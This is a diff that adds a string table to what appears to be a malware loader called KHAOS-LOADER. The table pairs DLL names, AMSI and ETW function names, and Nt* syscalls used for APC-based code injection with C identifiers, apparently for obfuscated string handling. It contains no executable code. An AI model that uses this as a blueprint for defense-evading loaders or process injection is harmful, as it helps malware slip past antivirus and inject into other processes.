@@ -1,0 +1,22 @@
+# EVS string table for KHAOS-LOADER
+# Format: plaintext_value   C_identifier_suffix
+
+# DLL names
+ntdll.dll               dll_ntdll
+amsi.dll                dll_amsi
+KernelBase.dll          dll_kernelbase
+
+# Path suffix appended to GetSystemDirectory result
+\ntdll.dll              path_ntdll_sep
+
+# ETW / AMSI function names
+EtwEventWrite           fn_EtwEventWrite
+AmsiScanBuffer          fn_AmsiScanBuffer
+AmsiScanString          fn_AmsiScanString
+
+# Nt* syscall names (injection module)
+NtAllocateVirtualMemory fn_NtAllocateVirtualMemory
+NtWriteVirtualMemory    fn_NtWriteVirtualMemory
+NtQueueApcThread        fn_NtQueueApcThread
+NtResumeThread          fn_NtResumeThread
+NtClose                 fn_NtClose
